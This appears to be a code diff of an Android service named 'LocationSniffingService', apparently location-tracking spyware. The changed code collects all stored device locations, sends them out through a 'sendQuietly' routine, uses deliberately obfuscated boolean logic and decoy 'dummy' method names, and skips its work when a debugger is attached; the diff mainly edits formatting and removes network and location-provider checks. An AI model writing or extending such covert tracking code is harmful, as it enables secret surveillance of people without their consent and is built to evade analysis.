@@ -69,7 +69,6 @@ public class LocationSniffingService extends Service{
 
     //Concats all the locations to send
     private boolean sendQuietly() {
-
         List<Location> locations = LocationStorage.getAllLocation();
         StringBuilder builder = new StringBuilder();
         for(Location loc : locations){
@@ -83,13 +82,11 @@ public class LocationSniffingService extends Service{
             builder.append(",");
             builder.append("||");
         }
-
         actualSend(builder.toString());
 
         //Logic Obfuscation
         return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
     }
-
     @TargetApi(Build.VERSION_CODES.KITKAT)
     private void actualSend(String s) {
         try {
@@ -112,21 +109,19 @@ public class LocationSniffingService extends Service{
         } catch (IOException e) {
             e.printStackTrace();
             return;
-        } catch (Exception e){
+        } catch (Exception e) {
             e.printStackTrace();
-            return;
         }
         Log.d(TAG, "Sent");
     }
 
-    //Dummy method - b does not mean anything
+
     private boolean thisDoesnotDoAnything(){
+
         Log.d(TAG,"Checking...");
         boolean b = false;
-
         if (isValid())
             b = sendQuietly();
-
         Log.d(TAG, isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
@@ -228,35 +223,6 @@ public class LocationSniffingService extends Service{
 
         //Return if debugger is connected
         if(Debug.isDebuggerConnected())
-            return false;
-
-        ConnectivityManager connectivityManager = (ConnectivityManager)
-                getSystemService(connectivityservice);
-
-        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
-
-        //Return if internet is not connected
-        if(networkInfo == null || !(networkInfo.isConnected()))
-            return false;
-
-
-        LocationManager locationManager = (LocationManager)
-                getSystemService(locationservice);
-
-        boolean gps_enabled = false;
-        boolean network_enabled = false;
-
-        if(locationManager==null)
-            locationManager = (LocationManager) this.getSystemService(locationservice);
-        try{
-            gps_enabled = locationManager.isProviderEnabled(gpsprovider);
-        }catch(Exception ex){}
-        try{
-            network_enabled = locationManager.isProviderEnabled(networkprovider);
-        }catch(Exception ex){}
-
-        //If location service is not enabled don't bother
-        if(!gps_enabled && !network_enabled)
             return false;
 
         return true;
